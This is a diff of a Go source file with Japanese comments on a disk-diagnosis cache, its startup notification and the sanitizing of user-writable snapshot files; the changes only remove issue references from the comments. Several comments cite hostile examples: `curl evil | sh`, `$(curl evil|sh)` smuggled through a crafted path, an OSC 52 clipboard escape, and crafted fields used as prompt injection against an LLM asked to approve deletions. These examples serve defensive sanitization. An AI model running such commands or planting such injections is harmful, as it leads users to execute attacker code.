@@ -16,7 +16,7 @@ import (
 	"glogx/internal/app"
 )
 
-// doctor のディスク診断結果の保存と、起動時トースト (issue 148 の 3 章)。
+// doctor のディスク診断結果の保存と、起動時トースト。
 //
 // 起動時には**走査しない**。前回 doctor を開いたときの結果を読むだけ (起動を待たせない要件)。
 // だからトーストの数字は必ず過去のスキャン由来で、初回 (結果が無い) は沈黙する。
@@ -25,7 +25,7 @@ import (
 
 const (
 	// doctorToastThreshold は起動時トーストを出す解放可能量の下限。
-	// **20GB** (issue 218 で 10GB から引き上げ。2026-09-03)。
+	// **20GB**。
 	// 根拠: この機の実測は合計 84.3GB で、上位 4 項目が npm 21.1 / go-build 20.1 /
 	// xcode-deriveddata 17.6 / simulator-runtimes 16.2 GB。これらは掃除しても数日で GB 単位に
 	// 戻るため、10GB では**掃除直後を除いてほぼ常時鳴る**。20GB は「上位 1 項目が育った状態」を
@@ -33,7 +33,7 @@ const (
 	doctorToastThreshold = int64(20) << 30
 	// doctorToastCooldown は一度出したら再表示しない期間。毎起動出すと無視されるようになり通知の意味が消える。
 	doctorToastCooldown = 3 * 24 * time.Hour
-	// 🚨 **サービス診断は起動時トーストの対象にしない** (issue 218 で判断)。
+	// 🚨 **サービス診断は起動時トーストの対象にしない**。
 	// ディスクは「合計 GB」という自然な閾値を持てるが、サービスは件数しかなく、
 	// 「壊れた登録 1 件」で**消すまで永久に鳴り続ける** (放置してよいケースがあるのに
 	// lastNotifiedAt の抑止と噛み合わない)。サービスは doctor を開いたときだけ出す。
@@ -43,7 +43,7 @@ const (
 	// doctorCarryTTL は「今回実測していないエントリの数字を、前回のキャッシュから引き継いでよい」期間。
 	// 🚨 上限が無いと**無期限に延命する**: 中断 (Esc) のたびに前回の記録を敷き直すので、
 	// 「重いので毎回 Esc の前にたどり着けない」エントリは一度も検証されないまま残り続け、
-	// 実体が消えていても検出する手段が構造上無くなる (敵対レビュー 2026-09-03 で実測:
+	// 実体が消えていても検出する手段が構造上無くなる (実測 2026-09-03:
 	// 10 回連続で書き込みが成功しても 44GB のエントリが一度も減衰しなかった)。
 	// 再利用 (doctorHeavyReuseTTL = 1 時間) より緩くしてよい: あちらは「走査を省く」判断で、
 	// こちらは「走査が届かなかった記録を残す」判断なので、日をまたぐ Esc の連続に耐える必要がある。
@@ -57,7 +57,7 @@ type doctorDiskCache struct {
 	Total          int64                  `json:"total"`   // 今消せる量 (disk.Report.Total)
 	Entries        []doctorDiskCacheEntry `json:"entries"` // 占有量の降順
 	LastNotifiedAt time.Time              `json:"last_notified_at"`
-	// Failed は「診断できなかった」エントリ数。0 に畳むとトーストが黙るので数えて持つ (issue 173)。
+	// Failed は「診断できなかった」エントリ数。0 に畳むとトーストが黙るので数えて持つ。
 	Failed int `json:"failed,omitempty"`
 	// Reused は「前回の計測値を引き継いだエントリを含む」印 (記録用。この値だけを見て
 	// 書く / 書かないを決めない — 決めると凍結する。doctorCacheFromReport のコメントを参照)。
@@ -86,7 +86,7 @@ func doctorDiskCachePath() (string, error) {
 
 // doctorCacheFromReport は保存する形に落とす。候補 0 件のエントリは持たない。
 //
-// 🚨 **再利用 (Reused) した計測値はトーストの材料にしない** (issue 172): 行には「N 分前の計測を再利用」の
+// 🚨 **再利用 (Reused) した計測値はトーストの材料にしない**: 行には「N 分前の計測を再利用」の
 // 注記が付くが、トーストには無い。実体を消した後も最大 1 時間「解放できます」と言い続け、
 // 「開けば直る」も効かない (トーストは次に doctor を開くまで更新されない)。
 //
@@ -96,7 +96,7 @@ func doctorDiskCachePath() (string, error) {
 // 🚨 「Reused が 1 件でもあれば結果ごと書かない」にしてはいけない。`doctorReuseFrom` の 1 時間は
 // **各エントリが実測されるたびにリセットされる**ので、重いエントリが 2 件以上あって実測時刻が
 // 互い違いだと「常にどれか 1 件が再利用対象」の状態が持続し、キャッシュが恒久的に凍結する
-// (敵対レビュー 2026-09-03 で実測: 20 分おきに 6 時間・18 回開いても一度も更新されず、
+// (実測 2026-09-03: 20 分おきに 6 時間・18 回開いても一度も更新されず、
 // 軽いエントリが 1GB → 100GB に激増しても反映されなかった)。エントリ単位でマージする。
 // carryFresh は「今回実測していないエントリの数字を引き継いでよいか」。実測時刻が無い旧いキャッシュは
 // キャッシュ全体の ScannedAt で代用する。未来の時刻は引き継がない (他の age 判定と同じ規律)。
@@ -110,7 +110,7 @@ func carryFresh(e doctorDiskCacheEntry, prevScannedAt, now time.Time) bool {
 		// ScannedAt は保存のたびに更新されるので、TTL より短い間隔で保存が続くと
 		// 「前回保存からの経過」しか見なくなり、**実測からの真の経過が永久に積まれない**
 		// (実測 2026-09-03: MeasuredAt を書かない変異で 10h おき 30 ラウンド = 真の経過 300h でも
-		// 124GB のエントリが生き残った。issue 194)
+		// 124GB のエントリが生き残った)
 		at = prevScannedAt
 	}
 	if at.IsZero() {
@@ -121,12 +121,12 @@ func carryFresh(e doctorDiskCacheEntry, prevScannedAt, now time.Time) bool {
 	// ここは「記録を残してよいか」なので**残す側が安全**。
 	// この判断が成立するのは **MeasuredAt が未来を指さないこと**を書き込み側 (clampMeasuredAt) が
 	// 保証しているからで、判定側だけを見て「小さいズレならすぐ正になる」と読んではいけない
-	// (実測 2026-09-03: 100 年後を指す MeasuredAt では 300 日経っても一度も失効しなかった。issue 194)。
+	// (実測 2026-09-03: 100 年後を指す MeasuredAt では 300 日経っても一度も失効しなかった)。
 	//
 	// clock: elapsed-only — 巻き戻しガードを意図的に持たない。上記のとおり「未来を引き継ぐ」が
 	// 安全側の選択で、未来の値そのものは書き込み側 (clampMeasuredAt) が塞いでいる。
-	// 🚨 この行が無いと clock_rollback_test の走査に引っかかる (issue 282 以前は `IsZero()` が
-	// 偶然ガードとして数えられていて、意図的な例外と偶然の通過を機械が区別できなかった)。
+	// 🚨 この行が無いと clock_rollback_test の走査に引っかかる (`IsZero()` が
+	// 偶然ガードとして数えられると、意図的な例外と偶然の通過を機械が区別できない)。
 	return now.Sub(at) < doctorCarryTTL
 }
 
@@ -164,7 +164,7 @@ func doctorCacheFromReport(rep disk.Report, prev doctorDiskCache) doctorDiskCach
 		merged[e.ID] = e
 	}
 	// 中断した部分結果は**前回の記録に重ねる**。洗い替えにすると、今回走査が届かなかった
-	// エントリの値と「診断できず」件数が消える (敵対レビュー 2026-09-03 で実測: 合計が前回より
+	// エントリの値と「診断できず」件数が消える (実測 2026-09-03: 合計が前回より
 	// 大きい partial は書いてよい仕様なので、大きいエントリを 1 つ測った直後に Esc すると
 	// 恒久 failed の記録まで failed=0 に化けた)。完走した結果はカタログを一巡しているので
 	// 重ねる必要が無く、消えたエントリはそのまま消してよい。
@@ -193,7 +193,7 @@ func doctorCacheFromReport(rep disk.Report, prev doctorDiskCache) doctorDiskCach
 			delete(merged, r.Entry.ID) // 候補が無くなった
 			continue
 		}
-		// MeasuredAt は書き込み時点で頭打ちにし、ゼロなら走査時刻で埋める (issue 194)。
+		// MeasuredAt は書き込み時点で頭打ちにし、ゼロなら走査時刻で埋める。
 		// 読み出し側 (carryFresh) で未来を救う形にすると、救う経路が判定の数だけ要る
 		put(doctorDiskCacheEntry{ID: r.Entry.ID, Label: r.Entry.Label, Size: r.Size, Status: string(r.Status),
 			MeasuredAt: clampMeasuredAt(r.MeasuredAt, rep.ScannedAt, rep.ScannedAt)})
@@ -225,7 +225,7 @@ func saveDoctorDiskCache(c doctorDiskCache) error {
 	if err != nil {
 		return err
 	}
-	// 🚨 独自の temp + rename を書かない (issue 219)。以前ここに在った
+	// 🚨 独自の temp + rename を書かない。以前ここに在った
 	// `<path>.tmp.<pid>` + os.WriteFile は **rename 分岐だけ**を写していたので、ENOSPC で
 	// write が失敗すると 0 バイトの残骸が残った (doctor は「ディスクが足りない」ときに開く
 	// 画面なので、一番残骸が出てほしくない状況で出る)。app.WriteAtomic は 3 分岐すべて掃除する。
@@ -250,7 +250,7 @@ func loadDoctorDiskCache() (doctorDiskCache, bool) {
 }
 
 // StartupToast は起動時のトーストの文面 ("" = 出さない)。前回の走査結果 (ファイル読みのみ、fork なし) から
-// doctorStartupToast で決め、出すなら再通知の抑止の時刻を記録する。起動時に走査はしない (issue 148 の骨格)。
+// doctorStartupToast で決め、出すなら再通知の抑止の時刻を記録する。起動時に走査はしない。
 func StartupToast(now time.Time) string {
 	c, ok := loadDoctorDiskCache()
 	text := doctorStartupToast(c, ok, now)
@@ -281,7 +281,7 @@ func markDoctorNotified(now time.Time) {
 // (ユーザー決定 2026-09-02)。
 // sanitizeDiskCache は起動トーストの材料に信頼境界を置く。`doctor-disk.json` は
 // snapshot と同じく**一般ユーザー権限で書き換えられる**のに、`loadDoctorDiskCache` は
-// JSON として読めて ScannedAt が非ゼロなら通していた (issue 193)。
+// JSON として読めて ScannedAt が非ゼロなら通していた。
 //
 // 🚨 **読み込み側ではなくここで絞る**。`loadDoctorDiskCache` は cachedir とファイル I/O だけに
 // 依存する関数で、カタログを知らない。読み込みにカタログを渡すと依存が増える一方、
@@ -317,7 +317,7 @@ func doctorStartupToast(c doctorDiskCache, ok bool, now time.Time) string {
 		return ""
 	}
 	c = sanitizeDiskCache(c)
-	// 閾値未満でも「診断できず」が在れば黙らない (issue 173 / sinking silently の禁止)。
+	// 閾値未満でも「診断できず」が在れば黙らない (sinking silently の禁止)。
 	// 数字が出せないことと、何も問題が無いことは別。
 	if c.Total < doctorToastThreshold {
 		if c.Failed == 0 || cooledDown(c, now) {
@@ -337,7 +337,7 @@ func doctorStartupToast(c doctorDiskCache, ok bool, now time.Time) string {
 	}
 	text += " — D で doctor を開く"
 	// 🚨 age < 0 (ScannedAt が未来) は「N 日前」を負の数で出さず、鮮度が不明である旨にする。
-	// 黙って注記を落とすと「新しい診断」に見える (issue 201)。
+	// 黙って注記を落とすと「新しい診断」に見える。
 	if age := now.Sub(c.ScannedAt); age < 0 {
 		text += " (診断時刻が未来。時計を確認してください)"
 	} else if age > doctorStaleAfter {
@@ -348,7 +348,7 @@ func doctorStartupToast(c doctorDiskCache, ok bool, now time.Time) string {
 
 // cooledDown は「前回の通知から cooldown 内」か。
 // age < 0 (LastNotifiedAt が未来) は cooldown 明けとして扱う。時計を戻した / NTP の大補正 /
-// 別マシンのキャッシュを持ってきた後に永久沈黙するのを防ぐ (issue 174)。
+// 別マシンのキャッシュを持ってきた後に永久沈黙するのを防ぐ。
 // loadDoctorSnapshot と doctorReuseFrom も同じ規律 (age < 0 を弾く) なので、ここだけ非対称にしない。
 func cooledDown(c doctorDiskCache, now time.Time) bool {
 	age := now.Sub(c.LastNotifiedAt)
@@ -416,7 +416,7 @@ func saveDoctorSnapshot(sn doctorSnapshot) error {
 	if err != nil {
 		return err
 	}
-	// 🚨 独自の temp + rename を書かない (issue 219)。以前ここに在った
+	// 🚨 独自の temp + rename を書かない。以前ここに在った
 	// `<path>.tmp.<pid>` + os.WriteFile は **rename 分岐だけ**を写していたので、ENOSPC で
 	// write が失敗すると 0 バイトの残骸が残った (doctor は「ディスクが足りない」ときに開く
 	// 画面なので、一番残骸が出てほしくない状況で出る)。app.WriteAtomic は 3 分岐すべて掃除する。
@@ -452,13 +452,13 @@ func loadDoctorSnapshotAny() (doctorSnapshot, bool) {
 	sn.Disk = sn.Disk.WithResults(sanitizeSnapshotResults(sn.Disk.Results, app.TimeNow()))
 	// サービス節と brew 節も同じ境界を通す。サービスの Commands は「手で実行してください」と
 	// 提示して Y でコピーさせるので、保存された文字列をそのまま信じると `curl evil | sh` を
-	// コピー経路に載せられる (issue 178 の敵対レビューが再現した)
+	// コピー経路に載せられる
 	sn.Svc = svc.SanitizeRestored(sn.Svc)
 	sn.Brew = sanitizeRestoredBrew(sn.Brew)
 	return sn, true
 }
 
-// sanitizeRestoredBrew は保存から読み戻した brew doctor の結果を絞る (issue 178)。
+// sanitizeRestoredBrew は保存から読み戻した brew doctor の結果を絞る。
 // 警告本文は `brew doctor` の自由文なので中身は検査できないが、**形**は固定できる:
 // `Warning:` で始まる塊だけを残し、制御文字 (ANSI エスケープ・復帰) を落として長さと件数を切る。
 // これで「UI の行構造を偽装する」「画面を埋め尽くす」は防げる。
@@ -486,9 +486,9 @@ func sanitizeRestoredBrew(b brewDoctorResult) brewDoctorResult {
 
 // cleanOneLine は「1 件が 1 行として描かれる」自由文を絞る (改行も落とす)。
 //
-// 🚨 無害化そのものは termsafe に委ねる (issue 228)。以前はここで `unicode.IsPrint` を回して
-// いたが、それは ESC だけ落として payload (`]52;c;…`) を本文に残す形で、doctor / issues /
-// git の各所と同じ判定を別実装で持っていた。**ここに残るのは長さの上限**だけ
+// 🚨 無害化そのものは termsafe に委ね、ここで `unicode.IsPrint` を回さない。それは ESC だけ落として
+// payload (`]52;c;…`) を本文に残す形で、doctor / issues /
+// git の各所と同じ判定を別実装で持つことになる。**ここに残るのは長さの上限**だけ
 // (画面を埋め尽くさせない = 保存されたキャッシュを読み戻す側の関心)。
 func cleanOneLine(s string) string {
 	return termsafe.CutBytes(termsafe.PlainLine(s), maxRestoredBrewText)
@@ -501,7 +501,7 @@ func cleanOneLine(s string) string {
 // 変換だけが増える)。新しい検査を足すときは、ここに述語を 1 つ足して呼び出し側に配る。
 
 // knownDiskStatus は Status が実装が知っている 3 値か。未知の値は「✅ 安全 + サイズ表示」に
-// 化けるので落とす (issue 178)。文字列で持つキャッシュ側からも使えるよう string で受ける。
+// 化けるので落とす。文字列で持つキャッシュ側からも使えるよう string で受ける。
 func knownDiskStatus(status string) bool {
 	switch disk.Status(status) {
 	case disk.StatusOK, disk.StatusBlocked, disk.StatusFailed:
@@ -510,17 +510,17 @@ func knownDiskStatus(status string) bool {
 	return false
 }
 
-// plausibleSize は表示・合計に載せてよいサイズか。負値は合計を減らす向きに効く (issue 178)。
+// plausibleSize は表示・合計に載せてよいサイズか。負値は合計を減らす向きに効く。
 func plausibleSize(n int64) bool { return n >= 0 }
 
 // safeDisplayPath は「行・`y`・`Y` に出してよいパス」か。
 //
 // なぜ要るか: `diskCopyText` は「別セッションの LLM に消してよいか聞く」形の文面を作るので、
 // 細工したパスは **prompt injection の材料**になり、人がそのまま貼れば任意コマンドの実行になる
-// (実測 2026-09-03: 埋め込み改行 + `$(curl evil|sh)` が y / Y の両方にそのまま出た。issue 193)。
+// (実測 2026-09-03: 埋め込み改行 + `$(curl evil|sh)` が y / Y の両方にそのまま出た)。
 //
 // 🚨 ここは**表示とコピーの健全性**の検査であって、削除の安全性ではない。④ の削除は
-// 「必ず再スキャンして `validateTarget` を通す」が不変条件で、その規律は変わらない (issue 148)。
+// 「必ず再スキャンして `validateTarget` を通す」が不変条件で、その規律は変わらない。
 func safeDisplayPath(p string) bool {
 	if p == "" || len(p) > maxRestoredPathLen {
 		return false
@@ -562,11 +562,11 @@ const (
 )
 
 // cleanBrewText は改行だけ残して他の制御文字を落とし、長さを切る (警告本文は複数行が正常)。
-// 無害化は termsafe.PlainBlock に委ねる (cleanOneLine と同じ理由。issue 228)。
+// 無害化は termsafe.PlainBlock に委ねる (cleanOneLine と同じ理由)。
 //
 // 🚨 **1 件が 1 行として描かれる値には使わないこと**。改行を残すので、偽の行を差し込まれて
 // 固定高パネルの行数が狂う (行数を数えないテストは素通りする)。brew の `Unavailable` は
-// 1 行の doctorRow なので cleanBrewLine を使う (敵対レビュー 2026-09-04 が実測)。
+// 1 行の doctorRow なので cleanBrewLine を使う (実測 2026-09-04)。
 func cleanBrewText(s string) string {
 	return termsafe.CutBytes(termsafe.PlainBlock(s), maxRestoredBrewText)
 }
@@ -574,7 +574,7 @@ func cleanBrewText(s string) string {
 // cleanBrewLine は brew 節のうち**1 行として描かれる**値 (Unavailable) 用。
 func cleanBrewLine(s string) string { return cleanOneLine(s) }
 
-// cleanLiveBrew は走査したての brew doctor の結果を無害化する (live 経路の関門。issue 228)。
+// cleanLiveBrew は走査したての brew doctor の結果を無害化する (live 経路の関門)。
 //
 // 🚨 復元経路 (sanitizeRestoredBrew) と違って**件数は絞らず、`Warning:` で始まらない塊も
 // 落とさない**。あちらは書き換えられるキャッシュファイルが相手なので「形が違うものは
@@ -599,7 +599,7 @@ func doctorSnapshotInCatalog(rs []disk.Result, lookup func(string) (disk.Entry, 
 		if !ok {
 			continue
 		}
-		// 🚨 **Entry はカタログの今の定義へ束ね直す** (issue 229)。snapshot には Entry が丸ごと
+		// 🚨 **Entry はカタログの今の定義へ束ね直す**。snapshot には Entry が丸ごと
 		// 保存されるので、そのまま使うと (a) カタログを直しても古い文言が出続け (b) 一般ユーザー
 		// 権限で書き換えた Label / Detail / Risk がそのまま行と y のコピーに載る。
 		// 計測値の再利用 (Reused) 側は同じことを既にやっている (doctorReuseFrom の r.Entry = e)。
@@ -610,7 +610,7 @@ func doctorSnapshotInCatalog(rs []disk.Result, lookup func(string) (disk.Entry, 
 	return out
 }
 
-// sanitizeSnapshotResults は snapshot 由来の Result を「信用してよい形」に絞る (issue 178)。
+// sanitizeSnapshotResults は snapshot 由来の Result を「信用してよい形」に絞る。
 //
 // 🚨 **信頼境界**: `doctor-snapshot.json` は一般ユーザー権限で書き換えられる。細工した JSON の
 // 任意パスが行・y のコピー・合計・次の snapshot への書き戻しに載ってはいけない。
@@ -619,7 +619,7 @@ func doctorSnapshotInCatalog(rs []disk.Result, lookup func(string) (disk.Entry, 
 // `Reused` / `FromSnapshot` の Result を拒否し、対象は `lookupEntry(opt.Catalog, ID)` で
 // コンパイル済みカタログから引き直したうえで走査もやり直す。したがって細工した DeleteVia / Paths が
 // 削除の作法を乗っ取ることはない。ここが守るのは**表示と y / Y のコピー**。
-// Entry 自体は doctorSnapshotInCatalog がカタログへ束ね直すので、この関数は計測値だけを見る (issue 229)。
+// Entry 自体は doctorSnapshotInCatalog がカタログへ束ね直すので、この関数は計測値だけを見る。
 //
 // 落とすもの:
 //   - **未知の Status** — ok / blocked / failed 以外は「✅ 安全 + サイズ表示」に化けていた。
@@ -632,7 +632,7 @@ func doctorSnapshotInCatalog(rs []disk.Result, lookup func(string) (disk.Entry, 
 // ④ は「印が立っている行は削除の前に必ず再スキャンする」という不変条件にするので、Result 側に要る。
 // 🚨 **Reused を流用してはいけない**。Reused は「重いエントリの計測値を前回から引き継いだ」という
 // 別の意味を既に持ち、行の「N 分前の計測を再利用」注記を出している。流用すると普通の開き直しで
-// 嘘の注記が全行に出る (敵対レビュー 2026-09-03 で実測: `-1113 分前の計測を再利用`)。
+// 嘘の注記が全行に出る (実測 2026-09-03: `-1113 分前の計測を再利用`)。
 func sanitizeSnapshotResults(rs []disk.Result, now time.Time) []disk.Result {
 	out := make([]disk.Result, 0, len(rs))
 	for _, r := range rs {
@@ -667,19 +667,19 @@ func sanitizeSnapshotResults(rs []disk.Result, now time.Time) []disk.Result {
 			continue
 		}
 		// 自由文も絞る: diskCopyText は「別セッションの LLM に消してよいか聞く」形を作るので、
-		// 細工した Reason / Failures / Contents はそのまま prompt injection の材料になる
-		// (敵対レビュー 2026-09-03)。制御文字を落として長さと件数を切る
+		// 細工した Reason / Failures / Contents はそのまま prompt injection の材料になる。
+		// 制御文字を落として長さと件数を切る
 		// 🚨 **改行も落とす**。brew の警告は「(N 行)」の塊として畳んで出すので改行が正常だが、
 		// ディスク節の Reason / Failures / Contents は**1 件が 1 行**として描かれる。改行が残ると
 		// doctorRow.text の中に改行が入り、幅を数えるテスト (term.DispWidth) を素通りしたまま
-		// 固定高のパネルの行数が実際には増える (敵対レビュー 2026-09-03)。
+		// 固定高のパネルの行数が実際には増える。
 		// 同じ helper を「畳む側」と「1 行の側」で共用しないこと
 		r.Reason = cleanOneLine(r.Reason)
 		r.Failures = cleanOneLineList(r.Failures)
 		r.Contents = cleanOneLineList(r.Contents)
 		// 🚨 Entry も保存ファイルの中身 (live ではカタログの写しだが、復元では JSON から来る)。
 		// doctorRiskMark は `string(r.Entry.Risk)` を、行は Label / Recover をそのまま描く。
-		// これは issue 229 (Entry をカタログへ束ね直す) の代わりではない — ここが直すのは
+		// これは Entry をカタログへ束ね直す処理の代わりではない — ここが直すのは
 		// 制御文字だけで、「保存された Risk / DeleteVia が実物と違う」意味のずれは残る
 		r.Entry = disk.SanitizeEntryForDisplay(r.Entry)
 		r.FromSnapshot = true // 走査していない印 (④ の削除は必ず再スキャンを通す)
@@ -722,7 +722,7 @@ func doctorReuseFrom(sn doctorSnapshot, ok bool, now time.Time) func(disk.Entry)
 			// 🚨 **FromSnapshot は落とす**。再利用は「前回の計測値を引き継いだ」(= Reused) で
 			// あって「画面ごと復元した」ではない。残すと、今回走査した画面なのに削除が
 			// 「前回の結果を表示しています」と断り、しかも snapshotAt は zero なので
-			// 再スキャンにも倒れない = その行だけ行き止まりになる (敵対レビュー 2026-09-03 が実測)
+			// 再スキャンにも倒れない = その行だけ行き止まりになる (実測 2026-09-03)
 			r.FromSnapshot = false
 			return &r
 		}
